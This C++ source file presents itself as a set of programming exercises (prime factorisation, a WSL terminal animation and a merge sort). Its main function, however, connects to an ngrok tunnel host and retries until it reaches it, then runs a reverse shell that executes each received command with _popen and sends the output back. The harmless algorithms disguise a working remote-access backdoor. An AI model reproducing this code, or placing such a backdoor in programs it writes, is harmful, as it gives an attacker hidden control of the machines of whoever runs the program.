#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <cstring>
#include <cstdlib>
using namespace std;

#define ll long long
#define MX 100005
#define bzero(p,size) (void)memset((p),0,(size))

int temp[MX], num[MX];
int sock;

// 🔢 Prime Factorization
class PrimeFactorization {
public:
    void Solve() {
        int n;
        cin >> n;
        for (int i = 2; i <= n; i++) {
            while (n % i == 0) {
                cout << i << "\n";
                n /= i;
            }
        }
    }
};

// 🎨 Terminal Animation via WSL
class LinuxTerminal {
public:
    void Solve() {
        for (int row = 0; row < 10; row++) {
            system("color 0B");
            for (int col = 0; col < row; col++) {
                cout << col;
            }
            cout << "\n";
        }
        for (int row = 10; row >= 0; row--) {
            system("color 0C");
            for (int col = 0; col < row; col++) {
                cout << col;
            }
            cout << "\n";
        }
        system("color 0A");
        system("wsl -d Ubuntu -- bash -c 'echo Hello from C++; sudo apt-get install figlet -y; figlet HELLO WORLD; ifconfig; echo hello vi;'");
    }
};

// 🧮 Merge Sort
class MargeSort {
public:
    void Marge(int lo, int hi) {
        if (lo == hi) return;
        int mid = (lo + hi) / 2;
        Marge(lo, mid);
        Marge(mid + 1, hi);

        int i = lo, j = mid + 1, k = lo;
        while (i <= mid && j <= hi) {
            if (num[i] < num[j]) temp[k++] = num[i++];
            else temp[k++] = num[j++];
        }
        while (i <= mid) temp[k++] = num[i++];
        while (j <= hi) temp[k++] = num[j++];

        for (k = lo; k <= hi; k++) num[k] = temp[k];
    }
};

class MargeInput : public MargeSort {
public:
    void Solve() {
        int n;
        cin >> n;
        for (int i = 1; i <= n; i++) cin >> num[i];
        Marge(1, n);
        for (int i = 1; i <= n; i++) cout << num[i] << "\n";
    }
};

// 🐚 Shell Execution
void shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (true) {
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        recv(sock, buffer, sizeof(buffer), 0);

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            exit(0);
        } else {
            FILE *fp = _popen(buffer, "r");
            while (fgets(container, sizeof(container), fp) != NULL) {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

// 🚀 Main
int main() {
    PrimeFactorization pf;
    pf.Solve();

    LinuxTerminal lt;
    lt.Solve();

    MargeInput ms;
    ms.Solve();

    WSADATA wsaData;
    struct sockaddr_in x;
    ll port = 15267;
    const char *ip = "0.tcp.in.ngrok.io";

    WSAStartup(MAKEWORD(2, 0), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&x, sizeof(x));

    x.sin_family = AF_INET;
    x.sin_port = htons(port);

    // ⭐ Resolve domain name to IP
    struct hostent *host;
    host = gethostbyname(ip);
    x.sin_addr = *((struct in_addr *)host->h_addr);

    while (connect(sock, (struct sockaddr *)&x, sizeof(x)) != 0) {
        Sleep(10);
    }

    shell();
    return 0;
}
